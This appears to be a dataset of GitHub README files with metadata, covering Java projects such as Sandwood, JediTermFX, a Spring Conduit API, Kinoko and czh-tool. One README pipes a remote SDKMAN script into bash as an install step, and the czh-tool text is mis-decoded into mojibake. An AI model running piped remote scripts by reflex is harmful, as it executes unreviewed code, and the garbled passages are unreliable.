* [Step 3](#step-3-concurrent-programming-pre-structured-concurrency) - Tasks executed concurrently, but using virtual threads. Examples also go into the difficulty of error handling and cancel propagation in a pre-structured concurrency world. 

* [Step 4](#step-4-concurrent-programming-with-structured-concurrency) - Various examples and scenarios demonstrating how to use structured concurrency to execute tasks concurrently.

* [Step 5](#step-5-working-with-scoped-values) - Simple examples using Scoped Values. 

### Step 1 - Linear Programming

The mindshare and difficulty of concurrent programming; configuring and managing threadpools, error handling and rollback when a task fails, the change in programming model, and disincentivized re-writing tasks from executing concurrently. Though meant that the time to execute tasks was the combined time to execute all the tasks, like in this example. This might often result in slow response times for clients. Like in this example. 

### Step 2 - Concurrent Programming Pre-Virtual Threads

Prior to virtual threads, when considering splitting a unit of work to be executed in concurrent tasks. This would making a choice between the best way of handling 

### Step 3 - Concurrent Programming Pre-Structured Concurrency

Splitting up a unit of work and executing it as concurrent tasks, wasn't always trivial, as we will review in these code examples. 

#### Cancel Propagation

Canceling other concurrent tasks when either a success of failure condition is met was difficult prior to structured concurrency. 

#### Debugging

When using [ ], the relationship between the tasks and subtasks wasn't tracked. This could make debugging difficult for applications receiving many requests, as it would be difficult to determine the parent thread that started the execution of the subtask. 

### Step 4 - Concurrent Programming with Structured Concurrency

#### Configuring Joiner Policies

#### Custom Cancellation Policies


### Step 5 - Working with Scoped Values


### Current State

Various ways of implementing a solution that can be broken into sub tasks executed concurrently. 

1. [SerialSolution](src/main/java/com/fly/us/SerialSolution.java) - Demonstrates calling multiple tasks serially. Easy to implement, understand, and debug, but slow, as the time to execute is the sum of all the tasks. 

2. [FuturesSolutionPreVirtualThreads](src/main/java/com/fly/us/FuturesSolutionPreVirtualThreads.java) - Pre Virtual Threads, there are many different executors to choose from with their own relative strengths and weaknesses. Knowing which to use was difficult.

3. [FuturesSolutionWithVirtualThreads](src/main/java/com/fly/us/FuturesSolutionWithVirtualThreads.java) - Demonstrates the new `Executors.newVirtualThreadPerTaskExecutor()`. Which should be used in nearly all cases. Just let the JDK handle mounting/unmounting virtual threads, they are cheap!

4. [FuturesSolutionShutdownOnError](src/main/java/com/fly/us/FuturesSolutionShutdownOnError.java) - The trouble with concurrency is failures happen! This is an example of the difficulty of handling that use case in current state. Primarily the canceling the execution of other tasks when a failure is detected. 

4. [FuturesSolutionShutdownOnSuccess](src/main/java/com/fly/us/FuturesSolutionShutdownOnSuccess.java) - Alternatively, maybe you want to get the first successful result. This example demonstrates that behavior. 

### Error Handling

### Debugging


",0,0,1,1.0,"['loominated', 'java', 'virtual', 'thread', 'structured', 'concurrency', 'scoped', 'value', 'about', 'project', 'run', 'project', 'the', 'task', 'work', 'project', 'step', 'linear', 'programming', 'step', 'concurrent', 'program', 'thread', 'step', 'concurrent', 'program', 'concurrency', 'cancel', 'propagation', 'debug', 'step', 'concurrent', 'program', 'structured', 'concurrency', 'configure', 'joiner', 'policy', 'custom', 'cancellation', 'policy', 'step', 'work', 'scoped', 'value', 'current', 'state', 'error', 'handle', 'debug']","['step', 'concurrency', 'project', 'concurrent', 'program']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
PavelKastornyy/jeditermfx,master,"# JediTermFX
* [Overview](#overview)
* [Demo](#demo)
* [Features](#features)
* [Terminal Comparison](#comparison)
* [Usage](#usage)
    * [Hyperlinks](#usage-hyperlinks)
* [Code building](#code-building)
* [Running the Application](#application)
    * [Using Maven](#application-maven)
    * [Using Distro](#application-distro)
* [License](#license)
* [Feedback](#feedback)

# Overview <a name=""overview""></a>

JediTermFX is a Terminal Emulator for JavaFX. The project is a result of porting
[JediTerm](https://github.com/JetBrains/jediterm) (commit 8366f2b) from Swing to JavaFX. JediTermFX exclusively
utilizes JavaFX components. Therefore, the Terminal Emulator based on this library can be seamlessly integrated into
any JavaFX application. A detailed comparison of terminal libraries is provided below.

# Demo <a name=""demo""></a>

![JediTermFX demo](./demo.gif)

# Features <a name=""features""></a>

* Local terminal for Unix, Mac and Windows using Pty4J
* Xterm emulation - passes most of tests from vttest
* Xterm 256 colours
* Scrolling
* Copy/Paste
* Mouse support
* Terminal resizing from client or server side
* Terminal tabs

# Terminal Comparison <a name=""comparison""></a>

Terminal      | JediTermFX  | [JediTerm](https://github.com/JetBrains/jediterm)  | [TerminalFX](https://github.com/javaterminal/TerminalFX) |
:-------------|:----------- |:--------------|:--------------|
GUI Library   | JavaFX      | Swing         | JavaFX        |
Main Component| Canvas      | JComponent    | WebView       |
Languages     | Java        | Java, Kotlin  | Java, JS      |
JPMS Support  | Yes         | No            | Yes           |

# Usage <a name=""usage""></a>

It is recommended to start working with JediTermFX by studying and running the
[BasicTerminalShellExample](jeditermfx-app/src/main/java/pk/jeditermfx/app/example/BasicTerminalShellExample.java) class.
This class contains the minimal code needed to launch a terminal in a JavaFX application.

## Hyperlinks <a name=""usage-hyperlinks""></a>

JediTermFX provides a wide range of features when working with links. The `HighlightMode` enumeration specifies multiple
modes of working with links and their colors. In the `ALWAYS` modes, links are always underlined and always clickable.
In the `NEVER` modes, links are never underlined and never clickable. In the `HOVER` modes, links become underlined and
clickable only when hovered over. Now let's clarify the difference between the two types of colors. `CUSTOM` colors
are those set by the JediTermFX user in the getHyperlinkColor() method of the settings. `ORIGINAL` colors are those
offered by the program running in the terminal. Thus, links can use either custom colors or the original text colors.

# Code Building <a name=""code-building""></a>

To build the library use standard Git and Maven commands:

    git clone https://github.com/PavelKastornyy/jeditermfx
    cd jeditermfx
    mvn clean install

# Running the Application <a name=""application""></a>

The project contains a demo application that shows how to use this library. There are two ways to run the application.

## Using Maven <a name=""application-maven""></a>

To run application using maven plugin execute the following commands in the root of the project:

    cd jeditermfx-app
    mvn javafx:run

Please note, that debugger settings are in `jeditermfx-app/pom.xml` file.

## Using Distro <a name=""application-distro""></a>

After building the project, you will find a distribution archive named `jeditermfx-version-app.tar` in the
`jeditermfx-app/target` directory. Extracting this file will allow you to launch the application using `.sh` or `.bat`
scripts depending on your operating system.

# License <a name=""license""></a>

JediTermFX is dual-licensed under both the LGPLv3 (found in the LICENSE-LGPLv3.txt file in the root directory) and
Apache 2.0 License (found in the LICENSE-APACHE-2.0.txt file in the root directory). You may select, at your option,
one of the above-listed licenses.

# Feedback <a name=""feedback""></a>

Any feedback is welcome. Besides, it would be interesting to know for what cases this project is used. It will
help to understand the way the project should go and provide more information in documentation.



",0,0,1,3.0,"['jeditermfx', 'overview', 'a', 'overview', 'demo', 'a', 'demo', 'feature', 'a', 'feature', 'terminal', 'comparison', 'a', 'comparison', 'usage', 'a', 'usage', 'hyperlink', 'a', 'code', 'building', 'a', 'run', 'application', 'a', 'application', 'use', 'maven', 'a', 'use', 'distro', 'a', 'license', 'a', 'license', 'feedback', 'a', 'feedback']","['a', 'overview', 'demo', 'feature', 'comparison']",4.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.openjfx:javafx-maven-plugin]",0.0,3.0,1.0
sivaprasadreddy/spring-realworld-conduit-api,main,"# Spring Boot RealWorld Conduit API

![Spring Boot RealWorld Conduit API](logo.png)

**Spring Boot RealWorld Conduit API** implements the [API Endpoints](https://realworld-docs.netlify.app/docs/specs/backend-specs/endpoints) of [Conduit](https://github.com/gothinkster/realworld),
which is a Medium.com clone.

[![CI Build](https://github.com/sivaprasadreddy/spring-realworld-conduit-api/actions/workflows/maven.yml/badge.svg)](https://github.com/sivaprasadreddy/spring-realworld-conduit-api/actions/workflows/maven.yml)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=sivaprasadreddy_spring-realworld-conduit-api&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=sivaprasadreddy_spring-realworld-conduit-api)
[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=sivaprasadreddy_spring-realworld-conduit-api&metric=coverage)](https://sonarcloud.io/summary/new_code?id=sivaprasadreddy_spring-realworld-conduit-api)

## Tech Stack
* [Java 21](https://dev.java/)
* [Spring Boot](https://spring.io/projects/spring-boot)
* [Spring Security](https://spring.io/projects/spring-security)
* [Spring Modulith](https://spring.io/projects/spring-modulith)
* [jOOQ](https://www.jooq.org/)
* [PostgreSQL](https://www.postgresql.org/)
* [FlywayDB](https://flywaydb.org/)
* [JUnit 5](https://junit.org/junit5/)
* [Testcontainers](https://testcontainers.com/)
* [Docker Compose](https://docs.docker.com/compose/)

## Prerequisites
* JDK 21
* Docker and Docker Compose
* Your favourite IDE (Recommended: [IntelliJ IDEA](https://www.jetbrains.com/idea/))

Install JDK using [SDKMAN](https://sdkman.io/)

```shell
$ curl -s ""https://get.sdkman.io"" | bash
$ source ""$HOME/.sdkman/bin/sdkman-init.sh""
$ sdk install java 21.0.1-tem
$ sdk install maven
```

Verify the prerequisites

```shell
$ java -version
openjdk version ""21.0.1"" 2023-10-17 LTS
OpenJDK Runtime Environment Temurin-21.0.1+12 (build 21.0.1+12-LTS)
OpenJDK 64-Bit Server VM Temurin-21.0.1+12 (build 21.0.1+12-LTS, mixed mode)

$ docker info
Client:
 Version:    27.0.3
 Context:    desktop-linux
 ...
 ...
Server:
 Server Version: 27.0.3
 ...
 ...

$ docker compose version
Docker Compose version v2.28.1-desktop.1
```

## How to?

```shell
# Clone the repository
$ git clone https://github.com/sivaprasadreddy/spring-realworld-conduit-api.git
$ cd spring-realworld-conduit-api

# Run tests
$ ./mvnw test

# Automatically format code using spotless-maven-plugin
$ ./mvnw spotless:apply

# Run/Debug application from IDE
Run `src/main/java/conduit/ConduitApplication.java` from IDE.

# Run application using Maven
./mvnw spring-boot:run
```

The application is configured to use Docker Compose to automatically start the application dependencies
such as PostgreSQL.

* PostgreSQL container connection properties:
  ```shell
  host: localhost
  port: 65432
  username: postgres
  password: postgres
  database: postgres
  ```
* Application run on port http://localhost:8080
* Swagger UI: http://localhost:8080/swagger-ui/index.html

## Using [Taskfile](https://taskfile.dev/) utility
Task is a task runner that we can use to run any arbitrary commands in easier way.

### Installation

```shell
$ brew install go-task
(or)
$ go install github.com/go-task/task/v3/cmd/task@latest

#verify task version
$ task --version
Task version: 3.35.1
```

### Using `task` to perform various tasks:

```shell

# Run tests
$ task test

# Automatically format code using spotless-maven-plugin
$ task format

# Build docker image
$ task build_image

# Run application in docker container
$ task start
$ task stop
$ task restart
```
",0,1,4,0.0,"['spring', 'boot', 'realworld', 'conduit', 'api', 'tech', 'stack', 'prerequisite', 'how', 'to', 'clone', 'repository', 'run', 'test', 'automatically', 'format', 'code', 'use', 'application', 'ide', 'run', 'application', 'use', 'maven', 'use', 'taskfile', 'http', 'utility', 'installation', 'use', 'task', 'perform', 'various', 'task', 'run', 'test', 'automatically', 'format', 'code', 'use', 'build', 'docker', 'image', 'run', 'application', 'docker', 'container']","['use', 'run', 'application', 'test', 'automatically']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.codehaus.mojo:properties-maven-plugin,org.graalvm.buildtools:native-maven-plugin,org.jacoco:jacoco-maven-plugin,org.sonarsource.scanner.maven:sonar-maven-plugin,org.springframework.boot:spring-boot-maven-plugin,org.testcontainers:testcontainers-jooq-codegen-maven-plugin]",0.0,1.0,0.0
oracle/sandwood,main,"# Sandwood
Sandwood is a language, compiler, and runtime for JVM based probabilistic models. It is designed to allow models to be written in a language that is familiar to Java developers. The resulting models take the form of Java objects allowing them to be well abstracted components of an encompassing system.

## What is probabilistic programming?
With a traditional Bayesian Model the user has to design the model, and then implement inference code for any operation they wish to perform on the model. This creates a number of issues:

1. Constructing inference code is technically challenging to do, and time consuming. This step presents an opportunity for subtle bugs to be introduced.

2. If the model is modified, then the inference code will have to be updated. This is also time consuming and technically challenging, leading to the following problems:

  * It acts as a deterrent to modifying models.

  * It is possible for different inference operations to get out of step so some work on the old model and some work on the new model.

  * It presents another opportunity for bugs to get in the inference algorithm as users try to make subtle adjustments to existing code.
	
3. Looking at the code it is hard to see what the model is. This harms maintainability.

Probabilistic programming overcomes these issues by allowing models to be described using either an API, or a domain specific language (DSL) as is the case with Sandwood. The [Sandwood DSL](docs/Sandwood.md) is compiled to produce Java classes that represent the model and implement all the required inference operations. This has a number of advantages:
* Users are no longer required to handle the technical complexity of constructing inference code.
* Updating the model is now just requires changes to the high-level language and then recompilation to generate the new inference code.
* Models described in the high-level language are much more understandable improving code maintainability.
* All the inference operations are guaranteed to be for the same model.
* User bugs are confined to the model, with the inference code coming from the compiler.

## Installation
Sandwood consists of 3 components each in their corresponding directory:

- The compiler and runtime (Sandwood)
- The plugin for Maven (SandwoodMavenPlugin)
- A set of example models (SandwoodExamples)

Each piece is dependent on the preceding pieces. Each component directory contains a Maven POM file to construct the component. For the compiler and the plugin these will need to be called with `install` to make them available for later stages, i.e. `mvn clean install`. The examples should only be built as `mvn clean package`.

Having installed Sandwood there are currently 3 ways of compiling a model:
1. A command line tool.
2. A Java library call.
3. A Maven plugin.

### Command Line Tool
To use Sandwood from the command line once the compiler and runtime have been built command line scripts that have similar functionality to `javac` can be found in `commandline/SandwoodC/bin`. To use this the user would typically add the bin directory to the path, then call sandwoodc.sh HMM.sandwood to compile the HMM model. `sandwoodc.sh -h` or `sandwoodc.bat -h` will result in a description of the usage and available options being printed out.

### Java Library Call
All the functionality of SandwoodC can be reached by calling the method `compile` in `org.sandwood.compilation.SandwoodC` and passing an array containing the arguments that would have been passed to the command line.

### Maven Plugin
The Maven plugin can be used to automatically trigger compilation of sandwood files when the dependent project is built. To use the plugin you need to add the sandwood runtime as a dependency, and add the plugin to the build. This is achieved with the following additions to the POM file:

```
<dependencies>
	<dependency>
		<groupId>org.sandwood</groupId>
		<artifactId>sandwood-runtime</artifactId>
		<version>0.3.0</version>
	</dependency>
</dependencies>
```

```
<build>
	<plugins>
		<plugin>
			<groupId>org.sandwood</groupId>
			<artifactId>sandwoodc-maven-plugin</artifactId>
			<version>0.3-SNAPSHOT</version>
			<executions>
				<execution>
					<configuration>
						<partialInferenceWarning>true</partialInferenceWarning>
						<sourceDirectory>${basedir}/src/main/java</sourceDirectory>
					</configuration>
					<goals>
						<goal>sandwoodc</goal>
					</goals>
				</execution>
			</executions>
		</plugin>
	</plugins>
</build>`
```

The inclusion of the element `<sourceDirectory>${basedir}/src/main/java</sourceDirectory>` instructs the plugin which directory to look in for models. Other useful flags include:

* `debug` This option is used to obtain debugging information from SandwoodC. Setting this option to `true` causes Sandwood to generate a trace of its actions. The default value is `false`. Note this flag is for debugging errors with the compiler configuration/compiler, not with the model being compiled. Errors and warnings in the sandwood model files will always be returned by the compiler.

* `partialInferenceWarning` This option is used to stop SandwoodC from failing when some inference steps cannot be constructed. Setting this option to `true` causes Sandwood to just generate warnings on missing steps. Default value is `false`.

* `sourceDirectory` This parameter sets which directory to look in for model files. Within this directory the models can be located in different packages.

* `outputDirectory` This parameter sets which directory the Java source code for the models should be placed into. The default value is `${project.build.directory}/generated-sources/sandwood`.

* `calculateIndividualProbabilities` This parameter specifies if the probabilities for each random variable constructed  in a loop should be calculated instead of a single value for all instances. The default value is `false`.

* `javadoc` This parameter instructs the compiler to generate JavaDoc to compliment the model. The default value is `false`.

* `javadocDirectory` This parameter specifies the location that the generated should be placed.

* `executable` This parameter allow for an alternative JVM to be specified to run the Sandwood compiler with.

## Documentation
What follows is an introduction to how to write Sandwood models and how to use the resultant classes that implement the models. 

An outline of the steps a model goes through can be seen in this diagram. Models start as a `.sandwood` file that is compiled to a set of class files. These can be instantiated multiple times to generate multiple instances of the model with different configurations.

![Picture describing the stages of sandwood model from source code to instantiated objects in a program.](docs/images/Components.jpg ""Picture describing the stages of sandwood model from source code to instantiated objects in a program."")


### Example Model
As a running example we will use a [Hidden Markov Model (HMM)](https://en.wikipedia.org/wiki/Hidden_Markov_model). This model is written here in Sandwood. This model should be saved in a file called `HMM.sandwood` in a package directory `org/sandwood/examples/hmm`. A fuller description of the language can be found [here](docs/Sandwood.md).

```java
package org.sandwood.examples.hmm;
 
model HMM(int[] eventsMeasured, int numStates, int numEvents) {
  //Construct a transition matrix m.
  double[] v = new double[numStates] <~ 0.1;
  double[][] m = dirichlet(v).sample(numStates);
 
  //Construct weighting for which state to start in.
  double[] initialState = new Dirichlet(v).sample();
      
  //Construct weighting for each event in each state.
  double[] w = new double[numEvents] <~ 0.1;
  double[][] bias = dirichlet(w).sample(numStates);
 
  //Allocate space to record the sequence of states.
  int sequenceLength = eventsMeasured.length;
  int[] st = new int[sequenceLength];
 
  //Calculate the movements between states.
  st[0] = categorical(initialState).sampleDistribution();
  for (int i: [1..sequenceLength) )
    st[i] = categorical(m[st[i - 1]]).sampleDistribution();
 
  //Emit the events for each state.
  int[] events = new int[sequenceLength];
  for (int j = 0; j < sequenceLength; j++)
    events[j] = new Categorical(bias[st[j]]).sample();
    
  //Assert that the events match the eventsMeasured data.
  events.observe(eventsMeasured);
}
```

In addition to the documentation of the Sandwood language and the JavaDoc comment that can be generated for a model there are a number of examples in the Sandwood Examples directory and we suggest new users start by examining and modifying these.

### Sandwood language
A description of the language used to describe Sandwood models can be found [here](docs/Sandwood.md). The language is constructed with the intent of being familiar to Java developers, but does not contain the ability to construct Objects. We plan to add support for record types in the future to make the import and export of data to and from models simpler.

### Compiled models
When a model is compiled a number of class files are generated in the same package that the model is defined in. One of these classes will have the same name as the name provided to the model, so in this case  _HMM.class_ , and this is the class that the user should instantiate in order to have an instance of the model. Each publicly visible variable in the model corresponds to a field in the generated class. The [example HMM](#example-model) can be seen below.

![Picture describing the classes created for the example HMM model](docs/images/ModelClasses.jpg ""Picture describing the classes created for the example HMM model"")

By running the compiler with the `javadoc` flag set JavaDoc will be created for each public method and class in the generated model file.

### Using Compiled Models
Once the model has been compiled we need to instantiate instances of it. These instances are independent and the user can create as many different copies of the model as they wish.

#### Constructing a model
Instances of the model object are constructed via the class constructor. As described earlier there are typically 3 constructors for the model. The only case when there will be fewer is when the different variants of the constructor map to the same signature, in which case one constructor will apply to more than one of these scenarios.

* Full constructor - This constructor takes all the arguments that appear in the model signature and sets them. This constructor is used for the infer values and infer probabilities operations.

* Empty constructor - This constructor takes no arguments, leaving the parameters for the user to set later.

* Execution Constructor - This constructor removes arguments that are only observed, and for observed arguments whose dimensions are used as inputs to the code, takes those dimensions instead of the full parameters. So in the HMM example the eventsMeasured parameter will become an integer describing the length of the sequence.

These code samples demonstrate how to make calls to the compiled models.

#### Interacting with a model
Interactions with a model via the model object takes two forms:

* Calls to model object methods for global operations such as setting default retention policies, checking if the model is ready for inference, and starting inference steps, etc. 

* Calls to model parameter objects. Each named public variable in the model is represented by a corresponding field in the model object. Variables are public if they are declared in the outermost scope of the model and not labelled `private`, or are declared in an inner scope and are not labelled `public`. If a field is declared public in an inner iterative scope, for example the body of a for loop, the value from each iteration will be stored.

  The type of the object will depend on the variable. These can be split into 3 categories:
  1. Observed variables: These are scalar or array variables that are set by the user.
  2. Inferred variables: These are scalar or array variables inferred by the model.
  3. Random variables: These [Random Variables](https://en.wikipedia.org/wiki/Random_variable) declared as named fields in the model. These can only have their probability queried.

  Each of these fields references an object with a set of methods that allow the user to set and read values and properties from the parameter. Properties that can be set and read include the probability of the parameter, the retention policy of the parameter, and if the parameter should be fixed at its current value.

Some of the more important methods of the parameter object when performing model inference are:

  * getSamples to return sampled values.

  * getMAP to return the [Maximum A Posteriori](https://en.wikipedia.org/wiki/Maximum_a_posteriori_estimation) value.

  * setValue to allow a value to be set to a specific value.

  * setFixed which takes a `boolean` to mark the value as fixed, and therefore not to be updated during inference. It is important to set the value of the parameter before fixing it.
  
  * getLogProbability which gets the log probability of the variable after inferring probabilities.
    
There are more methods, and we recommend consulting the JavaDoc to familiarise yourself with them.

#### Model operations

There are 3 basic types of operation that can be performed on a model:

1. **Infer Values** Having set the value of some of the variables of a model, infer values for the remaining variables. For the results of this method to be of interest some of the inferred values will need to be recorded. This can be done by recording the inferred values for every unset variable in the model model, or just a subset of the variables. The retention policy can be set for the entire model by a call to the method `setRentionPolicy` in the model class. Optionally individual variables can then have their retention policy set by calls to the corresponding `setRetentionPolicy` method in each variable object.

There are 3 sampling policies:
  * _NONE_  records no values. This is particularly useful if one of the variables is large so taking the time and space to store it would be wasteful.

  * _SAMPLE_  records the value from every iteration of the inference algorithm, so if 1000 iterations are performed 1000 values will be sampled from the each variable set to this retention policy. This is useful for calculating the variance as well as the average value. There is a weakness to this though, if the positions of values within the model can move during the inference then the values cannot be averaged over. For example with a topic model topics 2 and 3 may swap places during the inference, so averaging all the values for topic 2 with produce a mixture of topic 2 and topic 3. To overcome this Maximum A Posteriori (MAP) is also provided as a retention policy.

  * _MAP_  or [Maximum A Posteriori (MAP)](https://en.wikipedia.org/wiki/Maximum_a_posteriori_estimation) records the values of the variables when the model is in its most probable state. This overcomes the issue with transient value positions meaning values cannot be averaged, but at the expense of being able to calculate bounds. This option also has space advantages if some of the variables are large.

Configuration: Additional method calls on the model object allow the user to set properties such as  _burnin_  and  _thinning_  when performing this inference step. Burnin ignores the values from the first  _n_  iterations allowing the model to move away from a low probability starting point before starting to sample. Thinning reduces the autocorrelation induced by the MCMC procedure by only considering the values from every  _n_ th iteration.

2. **Infer Probabilities** Having set the values of some or all the parameters in the model calculate the probability of generating those values. This can be calculated for each variable in the model and for the model as a whole. 

3. **Execute Model** Run the model as if it was regular code generating new values for any parameters that are not fixed by the user. An example of when this behaviour would be used is for a linear regression model. In this case the model coefficients would first be inferred using training data. Once they have been inferred they would be fixed and new input data set. The model would then be executed to generate the corresponding predictions for this new input data. This form of execution could also be used to generate representative synthetic data from a trained model.

**Construct and train a model**

```java
//Load inputs
int nStates = 25;
int[] actions = loadActions(....);
int nActions = maxActions(....);

//Construct the model
HMM model = new HMM(actions, nActions, nStates);

//Set the retention policies
model.setDefaultRetentionPolicy(RetentionPolicy.MAP);
model.st.setRetentionPolicy(RetentionPolicy.NONE);

//Pick a random number generator. The ones introduced in Java 17 are faster and better quality.
model.setRNGType(RandomType.L64X1024MixRandom);

//Instruct the model to use the ForkJoin framework for parallel execution.
model.setExecutionTarget(ExecutionTarget.forkJoin);

//Run 2000 inference steps to infer model values
model.inferValues(2000);

//Gather the results.
double[] initialState = model.initialState.getMAP();
double[][] bias = model.bias.getMAP();
double[][] transitions = model.m.getMAP();
```

**Construct model and infer probabilities**

```java
//Load inputs
int nStates = 25;
int[] actions = loadActions(....);
int nActions = maxActions(....);

//Load model parameters
double[][] bias = model.bias.getMAP();
double[][] transitions = model.m.getMAP();

//Construct the model
HMM model = new HMM(actions, nActions, nStates);

//Set and fix trained values
model.bias.setValue(bias);
Model.m.setValue(transitions);

//Run 2000 inference steps to infer probabilities
model.inferProbabilities(2000);

//Recover the probabilities of the model parameter actions.
double actionsProbability = model.actions.getProbability();

//Recover the probability of the model as a whole
double modelProbability = model.getProbability()
```

**Train and execute a Liner Regression model**

```java
//Load parameters
double[] xs = loadXs(....);
double[] ys = loadYs(....);

//Construct the model
LinearRegression model = new LinearRegression(xs, ys);
â€¦
//Run 2000 inference steps to c, m, and sigma.
model.inferValues(2000);

//Fix the inferred values
model.c.setFixed(true);
model.m.setFixed(true);
model.sigma.setFixed(true);

//Set new input values
double[] new_xs = loadXs(....);
model.xs.setValue(new_xs);

//Run the model to generate sequences of actions using the inferred values
model.execute(1000);

//Recover the generated values
double[][] new_ys = model.ys.getSamples();
```

## Help
For help with Sandwood please start or join a discussion on the [discussions page](https://github.com/oracle/sandwood/discussions).

## Contributing
This project welcomes contributions from the community. Before submitting a pull
request, please [review our contribution guide](./CONTRIBUTING.md).

## Security

Please consult the [security guide](./SECURITY.md) for our responsible security
vulnerability disclosure process.

## License
Copyright (c) 2019-2024 Oracle and/or its affiliates.

Released under the Universal Permissive License v1.0 as shown at
<https://oss.oracle.com/licenses/upl/>.

",1,0,1,1.0,"['sandwood', 'what', 'probabilistic', 'programming', 'installation', 'command', 'line', 'tool', 'java', 'library', 'call', 'maven', 'plugin', 'documentation', 'example', 'model', 'sandwood', 'language', 'compile', 'model', 'use', 'compiled', 'model', 'construct', 'model', 'interact', 'model', 'model', 'operation', 'help', 'contribute', 'security', 'license']","['model', 'sandwood', 'what', 'probabilistic', 'programming']",12.0,"[maven-assembly-plugin,maven-clean-plugin,maven-resources-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-plugin-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:javacc-maven-plugin,org.sandwood:sandwoodc-maven-plugin]",0.0,8.0,3.0
iw2d/kinoko,main,"## Kinoko
Kinoko is a server emulator for the popular mushroom game.


## Setup
Basic configuration is available via environment variables - the names and default values of the configurable options are defined in [ServerConstants.java](src/main/java/kinoko/server/ServerConstants.java) and [ServerConfig.java](src/main/java/kinoko/server/ServerConfig.java).

> [!NOTE]
> Client WZ files are expected to be present in the `wz/` directory in order for the provider classes to extract the required data. The required files are as follows:
> ```
> Character.wz
> Item.wz
> Skill.wz
> Morph.wz
> Map.wz
> Mob.wz
> Npc.wz
> Reactor.wz
> Quest.wz
> String.wz
> Etc.wz
> ```

#### Java setup
Building the project requires Java 21 and maven.

```bash
# Build jar
$ mvn clean package
```


#### Database setup
It is possible to use either CassandraDB or ScyllaDB, no setup is required other than starting the database.
```bash
# Start CassandraDB
$ docker run -d -p 9042:9042 cassandra:5.0.0

# Alternatively, start ScyllaDB
$ docker run -d -p 9042:9042 scylladb/scylla --smp 1
```
You can use [Docker Desktop](https://www.docker.com/products/docker-desktop/) or WSL on Windows.


#### Docker setup
Alternatively, docker can be used to build and start the server and the database using the [docker-compose.yml](docker-compose.yml) file. The requirements are as follows:
- docker : required for building and running the server and database containers
- cqlsh : required for the health check for the database container

```bash
# Build and start containers
$ docker compose up -d
```
",0,9,1,7.0,"['kinoko', 'setup', 'java', 'setup', 'build', 'jar', 'database', 'setup', 'start', 'cassandradb', 'alternatively', 'start', 'scylladb', 'docker', 'setup', 'build', 'start', 'container']","['setup', 'start', 'build', 'kinoko', 'java']",1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-jar-plugin]",0.0,1.0,0.0
15139467313/czh-tool,master,"# czh-tool å¿«é€Ÿå¼€å‘æ¡†æ¶å·¥å…·


# [æ–‡æ¡£ä¸­å¿ƒ](http://czh.znunwm.top)
### ä»‹ç»
czh-tool åŸºäºSpringBootä¸€æ¬¾å¿«é€Ÿå•ä½“æ¡†æ¶é‡Œé¢é›†æˆäº†å¿«é€Ÿå¼€å‘éœ€è¦çš„ç¯å¢ƒæ¶æ„ä»£ç é›†æˆå·¥å…·

```
 é¡¹ç›®åŸºæœ¬ä¿æŒæ¯æ—¥æ›´æ–°ï¼Œå³ä¸Šéšæ‰‹ç‚¹ä¸ª ğŸŒŸ Star å…³æ³¨ï¼Œè¿™æ ·æ‰æœ‰æŒç»­ä¸‹å»çš„åŠ¨åŠ›ï¼Œè°¢è°¢ï½

```
# åŠŸèƒ½åˆ—è¡¨
- ç»Ÿä¸€è¿”å›å€¼å°è£…
- voidè¿”å›ç±»å‹å°è£…
- å…¨å±€å¼‚å¸¸å¤„ç†
- å‚æ•°æ ¡éªŒé”™è¯¯ç 
- è‡ªå®šä¹‰å“åº”ä½“ï¼Œé€‚åº”ä¸åŒé¡¹ç›®çš„éœ€æ±‚
- æ–‡ä»¶ä¸Šä¼ ä¸ä¸‹è½½
- æ¥å£æ—¥å¿—
- æ¥å£é˜²åˆ·

æ›´å¤šåŠŸèƒ½ï¼Œè¯·åˆ°[æ–‡æ¡£ä¸­å¿ƒ](http://czh.znunwm.top)çš„é¡¹ç›®ä¸»é¡µè¿›è¡Œäº†è§£ã€‚
## 2. å¿«é€Ÿå…¥é—¨  (ä»…æ”¯æŒSprinBoot2xç‰ˆæœ¬ä¸æ”¯æŒ3xç‰ˆæœ¬)

### 3.1 å¼•å…¥czh-toolç»„ä»¶

czh-toolå·²å‘å¸ƒè‡³mavenä¸­å¤®ä»“åº“ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å¼•å…¥åˆ°é¡¹ç›®ä¸­ã€‚

mavenä¾èµ–å¦‚ä¸‹ï¼š

xml

```java
    //ä»…æ”¯æŒsprinboot2xç‰ˆæœ¬ä¸æ”¯æŒ3xç‰ˆæœ¬
    <dependency>
            <groupId>io.github.15139467313</groupId>
            <artifactId>czh-tool</artifactId>
            <version>0.3.2</version>
        </dependency>
```

### 3.2 å¯ç”¨czh-tool

åœ¨å¯åŠ¨ç±»ä¸­å¼•å…¥@ EnableCzhToolæ³¨è§£ï¼Œå³å¯å¯ç”¨czh-toolç»„ä»¶ã€‚

```java
@EnableCzhTool
@SpringBootApplication
public class ExampleApplication {
    public static void main(String[] args) {
        SpringApplication.run(ExampleApplication.class, args);
    }
}
```

å¦‚æœæ‚¨è§‰å¾—è¿™ä¸ªé¡¹ç›®å¯¹æ‚¨æœ‰å¸®åŠ©ï¼Œå¯ä»¥å¸®ä½œè€…ä¹°æ¯é¥®æ–™é¼“åŠ±é¼“åŠ±!

<img src=""https://znunwm.top/upload/2023/04/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230402163414.jpg"" width = ""230"" height=""300"" style=""float:left; margin: 15px;""/>

<img src=""https://znunwm.top/upload/2023/04/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230402161550.jpg"" width = ""230"" height=""300"" style=""float:left; margin-left: 35px; display: inline;""/>


